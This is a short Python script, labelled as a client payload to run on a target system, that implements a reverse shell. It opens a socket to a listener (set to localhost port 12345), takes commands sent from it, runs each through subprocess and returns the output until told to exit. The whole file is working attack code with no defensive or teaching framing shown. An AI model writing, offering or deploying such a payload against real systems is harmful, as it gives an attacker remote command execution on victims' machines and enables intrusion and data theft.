# Client Payload (on target system)
import socket
import subprocess

host = '127.0.0.1'
port = 12345

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    command = client.recv(1024).decode()

    if command.lower() == "exit":
        break

    output = subprocess.getoutput(command)
    client.send(output.encode())

client.close()
